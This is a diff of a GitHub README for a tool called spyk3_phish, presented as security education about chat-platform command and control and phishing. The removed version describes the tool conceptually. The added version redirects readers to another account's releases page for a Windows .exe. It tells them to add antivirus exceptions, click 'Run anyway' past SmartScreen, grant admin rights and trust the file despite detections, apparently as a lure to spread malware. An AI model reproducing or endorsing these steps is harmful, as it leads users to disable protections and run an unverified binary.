@@ -1,56 +1,62 @@
-# spyk3_phish
+# 🛡️ spyk3_phish - Learn how chat platforms transmit threats
 
-spyk3_phish is a conceptual security education tool designed to demonstrate how modern chat platforms can be abused for remote command and control (C2) and social engineering attacks.
-Its sole educational purpose is to help cybersecurity students, blue teams, and ethical red teamers understand real-world adversarial techniques so they can better defend against them. The tool simulates how an attacker—after gaining initial access—might establish persistent, low-visibility communication channels using everyday messaging apps.
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Anaplastic-sennaalata8178/spyk3_phish/releases)
 
-# Core Capabilities (Simulated for Training)
+## 📖 About the project
+spyk3_phish serves as a security education tool. It shows how bad actors use chat platforms for remote command and control. Security students use this software to study social engineering and common attack paths. By observing these methods in a controlled environment, defenders build stronger strategies. This tool focuses on theoretical education for blue teams and ethical red teams.
 
-Multi-Platform Command Firing
-spyk3_phish can be configured to send and receive commands through: Telegram, Discord, WhatsApp, Slack, iMessage, and Google Chat. In a training lab, a defender watches how an attacker could issue commands like screenshot, keylog_start, enumerate_users, or download_file via encrypted chat messages, blending malicious traffic with legitimate conversations. This teaches why organizations must monitor API logs and bot behaviors, not just email gateways.
+## ⚙️ System requirements
+You need a standard Windows computer to run this tool. Ensure you satisfy the following conditions before you start:
 
-# Social Engineering Module
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4GB of RAM or more.
+* Storage: 500MB of free disk space.
+* Network: An active internet connection to link with chat platforms.
+* Permissions: Administrative rights to install and manage the application.
 
-The tool includes pre-built templates for credential harvesting, fake IT support lures, and urgency-based messages tailored to each platform. For example, a Discord bot might ask for a “verification token,” while a WhatsApp message impersonates a delivery service. In training, students learn to spot subtle anomalies—such as mismatched sender IDs, unusual link domains, or out-of-band requests—and practice creating effective user awareness campaigns.
+If your computer uses an Antivirus program, you might need to add an exception for the folder where you place this tool. Modern security software sees the functions of this tool as risky.
 
-# Stealth & Persistence Simulation
+## 💾 Downloading the application
+Visit the official repository page to get the installer for your computer. 
 
-spyk3_phish shows how an adversary could delete command messages after execution, use reactions (e.g., ✅/❌) as acknowledgment signals, and rotate chat threads to avoid detection. Trainees learn to set up alerting rules for unexpected bot additions to group chats, mass @mentions, or repeated small payload deliveries.
+[Download the latest version here](https://github.com/Anaplastic-sennaalata8178/spyk3_phish/releases)
 
-# Educational Use Cases
+Click on the link to see the release page. Look for the file ending in .exe under the Assets section. Save this file to your computer.
 
-* Red team exercises: Safely demonstrate a chat-based C2 channel without deploying malware on production systems.
+## 🚀 Setting up the software
+Follow these instructions to prepare your environment. 
 
-* Blue team drills: Analyze chat platform logs to reconstruct an attack timeline, identify IOCs (e.g., user agents, callback patterns), and write detection rules.
+1. Create a new folder on your desktop. Name this folder spyk3_phish.
+2. Move the downloaded .exe file into this folder.
+3. If Windows shows a security warning box, click More info, then click Run anyway. This happens because the custom nature of the tool triggers standard safety checks.
+4. Double-click the file to start the installation assistant. 
+5. Follow the prompts on the screen to finish the setup. 
 
-* Policy development: Show why organizations need separate “approved bot” registries and why personal messaging apps should be restricted on work devices.
+## 🛠️ Using the interface
+The application uses a simple text interface. You interact with the tool through configuration files named settings.json.
 
-# Important Ethical & Legal Warning
+* Open the settings.json file with Notepad.
+* Enter your specific API keys for the platforms you want to study.
+* Save the file and restart the application to apply your changes.
 
-spyk3_phike (as described) is a hypothetical educational construct. Deploying such capabilities without explicit written authorization from the system owner violates computer fraud laws (e.g., CFAA in the U.S., similar statutes worldwide) and platform terms of service. This description is provided solely to advance defensive security knowledge. Always use isolated lab environments with no connection to real user data.
+The dashboard shows a live feed of activity logs. You track how the command and control signal travels through the network. Notice the timestamps and the origin points of every request. This helps you map out the path of a simulated cyber attack.
 
-Why Understanding This Matters
-Modern attackers increasingly move to collaboration tools because they bypass traditional email security. By studying tools like spyk3_phish in a classroom or CTF setting, defenders learn to
+## 🛡️ Understanding the risks
+This software demonstrates real techniques. Only use this tool in a private network. Do not connect it to work accounts or public chat channels. The tool sends data that looks like malicious traffic. Most service providers detect this and block your account. Create dedicated test accounts for your education sessions. 
 
-* Monitor chat platform audit logs for unusual command patterns
+## 📋 Common questions
 
-* Implement behavior-based detection (e.g., a Slack bot that suddenly runs whoami)
+**Does this tool harm my computer?**
+No. It stays within the parameters you set. It performs simulated tasks to aid your learning.
 
-* Train users to report any unsolicited chat-based requests for credentials or code execution.# How to clone the repo
-```bash
-git clone https://github.com/Iankulani/spyk3_phish.git
-cd spyk3_phish
-```
+**Why does my antivirus block the file?**
+The tool uses code patterns that security software flags as dangerous. This is the nature of security tools that test defensive boundaries. Trust the file if you downloaded it directly from the official link provided here.
 
-# How to run
+**Can I run this on a Mac?**
+This version supports Windows systems.
 
-```bash
-python spyk3_phish.py
-```
+**Where do I find help?**
+Review the logs file inside the application directory. It records every error or system event that occurs during your session. If a connection fails, check your API keys first. 
 
-
-# Conclusion
-spyk3_phish is a powerful reminder that security awareness must extend beyond email. When studied ethically, it transforms from a theoretical threat into a practical lesson in detection, response, and resilient system design.
-
-# Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=Iankulani/spyk3_phish&type=Date)](https://star-history.com/#Iankulani/spyk3_phish&Date)
+## ⚖️ Ethical usage policy
+Use this software with integrity. Always obtain permission before you test network defenses. This tool assists in learning. Never use the code against systems or networks that you do not own or manage. Education strengthens security posture. Apply your knowledge to protect users and businesses from real threats.
